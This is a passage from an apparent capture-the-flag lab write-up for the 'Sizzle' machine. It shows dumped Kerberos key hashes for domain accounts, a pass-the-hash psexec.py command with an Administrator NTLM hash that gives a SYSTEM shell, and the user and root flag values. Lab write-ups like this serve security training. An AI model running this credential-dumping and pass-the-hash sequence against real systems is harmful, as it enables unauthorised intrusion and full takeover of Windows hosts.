mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:1d5aa7a7f297e942eb35db654b039a536089168e4ba0ad8c85ee8029d8fa805f
SIZZLE$:aes128-cts-hmac-sha1-96:f0023b9ff84bedbc3cb0f58d3a8a0d05
SIZZLE$:des-cbc-md5:62ea0e514537a1e6
[*] Cleaning up...
```

We could now use the `NTLM` hash of the `Administrator` to do `psexec.py` into the box.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # psexec.py Administrator@10.10.10.103 -hashes f6b7160bfc91823792e0ac3a162c9267:f6b7160bfc91823792e0ac3a162c9267
Impacket v0.9.23.dev1+20210419.165326.f9453d21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.103.....
[*] Found writable share ADMIN$
[*] Uploading file nvRQCtoq.exe
[*] Opening SVCManager on 10.10.10.103.....
[*] Creating service fVZP on 10.10.10.103.....
[*] Starting service fVZP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
![[Pasted image 20210714223250.png]]

## Getting the user Flag
```python
C:\Users\mrlky\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C78-BB37

 Directory of C:\Users\mrlky\Desktop

07/10/2018  06:24 PM    <DIR>          .
07/10/2018  06:24 PM    <DIR>          ..
07/14/2021  02:19 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  14,542,123,008 bytes free

C:\Users\mrlky\Desktop>type user.txt
faa53b19ad2a98dd4bdde5b0db058969
```

## Getting the root Flag
```python
C:\Users\administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C78-BB37

 Directory of C:\Users\administrator\Desktop

02/11/2021  08:29 AM    <DIR>          .
02/11/2021  08:29 AM    <DIR>          ..
07/14/2021  02:19 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  14,542,106,624 bytes free

C:\Users\administrator\Desktop>type root.txt
3b7b9dd6c8c00be54aa8ca833e57a1fd
```